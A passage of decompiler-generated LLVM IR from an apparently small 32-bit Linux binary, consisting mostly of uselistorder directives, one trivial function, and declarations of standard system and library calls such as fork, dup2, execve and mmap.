793, 794, 258, 408, 407, 406, 795, 796, 797, 798, 799, 800, 801, 802, 211, 233, 803, 259, 804, 805, 806, 260, 807, 808, 261, 809, 810, 811, 812, 813, 330, 411, 410, 409, 56, 55, 57, 289, 290, 837, 838, 839, 840, 222, 610, 611, 612, 141, 633, 412, 50, 51, 291, 413, 52, 314, 634, 635, 636, 262, 331, 637, 414, 638, 263, 639, 640, 426, 425, 424, 423, 422, 421, 420, 419, 418, 417, 416, 415, 190, 192, 187, 184, 188, 183, 186, 191, 185, 189, 717, 718, 3, 80, 79, 78, 77, 76, 427, 181, 182, 428, 53, 54, 641, 642, 429, 147, 146, 148, 841, 842, 843, 43, 44, 42, 430, 643, 431, 91, 95, 96, 92, 94, 93, 644, 292, 434, 433, 432, 435, 90, 436, 438, 437, 117, 439, 194, 440, 196, 441, 197, 442, 73, 444, 443, 103, 445, 71, 447, 446, 149, 448, 452, 451, 450, 449, 65, 846, 847, 848, 455, 454, 453, 46, 47, 45, 293, 456, 459, 458, 457, 165, 294, 357, 591, 844, 461, 460, 32, 30, 31, 332, 462, 463, 13, 14, 618, 207, 215, 619, 365, 464, 113, 115, 112, 114, 465, 127, 125, 123, 124, 129, 128, 126, 134, 131, 133, 135, 130, 132, 333, 466, 334, 467, 335, 468, 336, 470, 469, 358, 473, 472, 471, 161, 337, 856, 857, 858, 474, 70, 851, 852, 223, 853, 854, 855, 122, 120, 121, 359, 850, 264, 162, 164, 163, 338, 814, 815, 816, 817, 818, 819, 820, 821, 822, 265, 823, 824, 825, 826, 827, 297, 828, 829, 201, 298, 830, 831, 832, 833, 295, 296, 834, 835, 836, 477, 476, 475, 27, 26, 25, 29, 28, 299, 300, 478, 266, 360, 479, 480, 481, 482, 483, 484, 859, 234, 861, 339, 246, 340, 865, 235, 489, 488, 487, 486, 485, 40, 41, 490, 491, 719, 720, 492, 106, 495, 494, 493, 75, 496, 723, 724, 725, 645, 646, 369, 497, 136, 682, 683, 684, 685, 686, 687, 688, 647, 862, 863, 864, 499, 498, 12, 11, 10, 689, 690, 500, 139, 138, 137, 757, 860, 501, 59, 58, 60, 502, 648, 649, 592, 268, 650, 651, 652, 653, 654, 656, 657, 658, 269, 660, 209, 659, 208, 224, 225, 267, 661, 270, 662, 663, 664, 655, 506, 505, 504, 503, 86, 88, 87, 83, 85, 84, 89, 665, 507, 111, 108, 110, 109, 271, 508, 666, 667, 510, 509, 81, 82, 668, 669, 238, 237, 230, 670, 301, 671, 672, 236, 673, 272, 674, 341, 675, 512, 511, 15, 17, 16, 18, 273, 342, 4, 343, 5, 226, 513, 514, 24, 23, 845, 516, 515, 166, 167, 302, 849, 517, 193, 520, 519, 518, 8, 521, 523, 522, 97, 524, 72, 525, 160, 527, 526, 107, 528, 159, 529, 35, 62, 531, 530, 39, 532, 34, 533, 33, 535, 534, 178, 536, 195, 537, 538, 74, 539, 36, 541, 540, 37, 542, 151, 150, 620, 613, 239, 614, 615, 616, 617, 621, 549, 548, 547, 546, 545, 544, 543, 198, 199, 350, 593, 550, 622, 63, 64, 274, 240, 551, 303, 276, 623, 311, 275, 312, 624, 625, 553, 552, 351, 626, 627, 344, 304, 305, 628, 555, 554, 629, 630, 306, 345, 277, 631, 632, 561, 560, 559, 558, 557, 556, 316, 317, 676, 677, 241, 307, 678, 278, 279, 679, 680, 563, 562, 366, 48, 681, 564, 242, 691, 566, 565, 692, 567, 352, 693, 694, 353, 695, 696, 354, 355, 697, 698, 699, 243, 700, 308, 346, 570, 569, 568, 347, 244, 280, 701, 571, 572, 6, 574, 573, 575, 702, 703, 704, 705, 706, 229, 707, 578, 577, 576, 49, 348, 7, 580, 579, 367, 281, 708, 228, 709, 710, 282, 711, 227, 712, 713, 283, 309, 361, 714, 368, 715, 716, 284, 721, 722, 582, 581, 356, 210, 726, 727, 583, 728, 729, 140, 310, 362, 584, 589, 588, 587, 586, 585, 590 }
  uselistorder label %dec_label_pc_8056b66, { 1, 0 }
}

define i32 @function_8056b78() local_unnamed_addr {
entry:
  %v0_8056b7b = load i32, i32* @ebx, align 4
  %v1_8056b7c = call i32 @function_80480b0(i32 %v0_8056b7b)
  store i32 %v1_8056b7c, i32* @eax, align 4
  %v0_8056b87 = call i32 @function_80480c0()
  ret i32 %v0_8056b87

; uselistorder directives
  uselistorder i32* @eax, { 16, 76, 3, 21, 78, 0, 5, 79, 80, 4, 81, 1, 20, 2, 77, 82, 22, 83, 45, 46, 47, 17, 48, 84, 86, 85, 7, 8, 87, 88, 89, 23, 90, 91, 92, 93, 94, 95, 96, 97, 98, 24, 99, 100, 61, 62, 101, 25, 26, 102, 27, 103, 28, 29, 104, 105, 106, 40, 107, 41, 108, 109, 110, 30, 111, 6, 31, 32, 112, 113, 33, 114, 34, 115, 116, 35, 36, 37, 117, 118, 119, 120, 38, 121, 122, 123, 124, 39, 63, 71, 125, 132, 133, 42, 134, 135, 137, 43, 138, 9, 136, 13, 15, 131, 54, 18, 49, 50, 56, 51, 139, 141, 142, 140, 126, 127, 129, 130, 128, 143, 44, 10, 11, 64, 66, 65, 67, 68, 70, 52, 69, 53, 55, 57, 58, 59, 60, 19, 72, 73, 144, 74, 75, 12, 14 }
  uselistorder i32 (i32)* @function_80480b0, { 1, 0 }
  uselistorder i32 0, {}
  uselistorder i32* @ebx, { 35, 509, 4, 510, 511, 512, 5, 513, 514, 515, 516, 517, 518, 519, 520, 521, 524, 525, 526, 527, 528, 529, 6, 530, 7, 531, 532, 385, 386, 533, 535, 538, 539, 540, 541, 542, 536, 534, 537, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 36, 37, 38, 42, 43, 44, 45, 46, 47, 48, 49, 50, 563, 564, 0, 565, 566, 567, 568, 569, 570, 571, 572, 573, 51, 52, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 387, 388, 389, 594, 595, 596, 597, 598, 599, 8, 600, 9, 601, 602, 603, 604, 605, 606, 607, 390, 391, 392, 393, 608, 609, 610, 611, 612, 613, 614, 11, 621, 619, 620, 622, 625, 623, 624, 626, 627, 628, 10, 630, 629, 1, 631, 632, 633, 634, 635, 636, 12, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 652, 53, 54, 55, 56, 57, 58, 59, 60, 480, 481, 482, 394, 395, 472, 473, 13, 474, 475, 476, 14, 477, 15, 478, 479, 396, 397, 16, 398, 399, 400, 401, 402, 403, 404, 681, 682, 17, 683, 684, 687, 688, 405, 406, 490, 491, 689, 18, 690, 691, 692, 693, 694, 695, 696, 697, 61, 698, 699, 700, 653, 654, 701, 702, 703, 33, 34, 722, 723, 724, 727, 30, 19, 28, 713, 716, 720, 721, 704, 705, 706, 712, 62, 63, 64, 65, 66, 67, 114, 115, 20, 2, 116, 126, 127, 69, 117, 118, 119, 68, 70, 128, 129, 130, 749, 750, 71, 72, 73, 74, 751, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 754, 755, 21, 756, 757, 752, 753, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 31, 666, 667, 668, 669, 670, 22, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 747, 748, 768, 769, 770, 771, 772, 773, 23, 774, 775, 776, 498, 499, 500, 501, 502, 483, 728, 729, 730, 731, 732, 733, 734, 737, 738, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 452, 453, 24, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 25, 467, 468, 469, 470, 471, 75, 76, 77, 78, 447, 449, 448, 3, 450, 451, 707, 26, 708, 709, 710, 32, 27, 29, 711, 739, 740, 741, 742, 743, 39, 40, 41, 685, 686, 120, 121, 745, 746, 503, 504, 522, 523, 492, 493, 714, 715, 615, 616, 735, 736, 494, 495, 617, 618, 725, 726, 381, 382, 496, 497, 650, 651, 744, 717, 718, 719, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 122, 123, 124, 125, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 383, 384, 484, 485, 486, 487, 488, 489, 505, 506, 507, 508 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i32 @_strlen(i8*) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @vfork() local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @dup2(i32, i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @ioctl(i32, i32, ...) local_unnamed_addr

declare i32 @kill(i32, i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32* @mmap(i32*, i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @munmap(i32*, i32) local_unnamed_addr

declare i32 @wait4(i32, i32, i32, %rusage*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i16 @__decompiler_undefined_function_1() local_unnamed_addr

declare i64 @__decompiler_undefined_function_2() local_unnamed_addr

declare i8** @__decompiler_undefined_function_3() local_unnamed_addr

declare i8* @__decompiler_undefined_function_4() local_unnamed_addr

declare i8 @__decompiler_undefined_function_5() local_unnamed_addr

declare i16* @__decompiler_undefined_function_6() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_7() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_8() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_9() local_unnamed_addr

declare %rusage* @__decompiler_undefined_function_10() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_11() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
